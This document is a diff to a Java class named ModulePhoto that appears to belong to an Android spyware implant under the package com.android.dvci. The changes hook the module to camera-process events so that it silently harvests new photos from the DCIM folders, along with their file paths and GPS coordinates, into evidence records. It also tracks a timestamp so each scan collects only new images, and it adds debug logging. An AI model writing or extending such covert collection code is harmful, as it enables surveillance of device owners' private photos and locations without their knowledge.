@@ -25,7 +25,6 @@ import com.android.dvci.util.WChar;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.util.ArrayList;
 import java.util.Date;
 import java.util.concurrent.Semaphore;
 
@@ -34,7 +33,7 @@ import java.util.concurrent.Semaphore;
  */
 public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
-	private static final String TAG = "ModuleClipboard"; //$NON-NLS-1$
+	private static final String TAG = "ModulePhoto"; //$NON-NLS-1$
 	private static final int LOG_PHOTO_VERSION = 2015012601;
 
 	Semaphore semaphorePhoto = new Semaphore(1);
@@ -58,16 +57,32 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		//https://stackoverflow.com/questions/2169649/get-pick-an-image-from-androids-built-in-gallery-app-programmatically
 		//MediaStore.Images.Media.query()
 
+		markupPhoto = new Markup(this);
 		fetchPhotos();
+		ListenerProcess.self().attach(this);
 	}
+
+
+	@Override
+	protected void actualStop() {
+		ListenerProcess.self().detach(this);
+	}
+
 
 	private void fetchPhotos() {
 		if (!semaphorePhoto.tryAcquire()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (fetchPhotos), still fetching, return");
+			}
 			return;
 		}
 		try {
 			lastTimestamp = markupPhoto.unserialize(new Long(0));
 			long newtimestamp = getCameraPhoto(lastTimestamp);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (fetchPhotos) serialize timestamp: " + newtimestamp);
+			}
 			markupPhoto.serialize(newtimestamp);
 		} finally {
 			semaphorePhoto.release();
@@ -76,6 +91,9 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 	private long getCameraPhoto(long lastTimestamp) {
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getCameraPhoto)");
+		}
 		Context context = Status.getAppContext();
 
 		String[] places = new String[]{"/DCIM/Camera", "/DCIM/100MEDIA"};
@@ -83,7 +101,9 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 
 		for (String place : places) {
-
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCameraPhoto) try: " + place);
+			}
 			String cameraBucketName = environment + place;
 
 			String bucketID = getBucketId(cameraBucketName);
@@ -97,11 +117,12 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 
 	@Override
 	public int notification(ProcessInfo b) {
-		if(b.processInfo.contains("camera") && b.status== ProcessStatus.STOP){
+		if (b.processInfo.contains("camera") && b.status == ProcessStatus.STOP) {
 			fetchPhotos();
 		}
 		return 0;
 	}
+
 
 	class ImageVisitor {
 		long visitor(Cursor cursor) {
@@ -147,6 +168,11 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 	}
 
 	public static long getCameraImages(Context context, String place, ImageVisitor visitor) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getCameraImages) place: " + place);
+		}
+
 		final String[] projection = {MediaStore.Images.Media.DATA};
 		final String selection = MediaStore.Images.Media.BUCKET_ID + " = ?";
 		final String[] selectionArgs = {place};
@@ -157,7 +183,7 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 				null);
 
 		long lasttimestamp = 0;
-		ArrayList<String> result = new ArrayList<String>(cursor.getCount());
+
 		if (cursor.moveToFirst()) {
 			do {
 				long last = visitor.visitor(cursor);
@@ -167,11 +193,6 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		}
 		cursor.close();
 		return lasttimestamp;
-	}
-
-	@Override
-	protected void actualStop() {
-
 	}
 
 
@@ -186,7 +207,7 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			data.put("program", "photo");
 			data.put("path", path);
 
-			if(!StringUtils.isEmpty(lat) && !StringUtils.isEmpty(lon) ) {
+			if (!StringUtils.isEmpty(lat) && !StringUtils.isEmpty(lon)) {
 				place.put("lat", lat);
 				place.put("lon", lon);
 			}
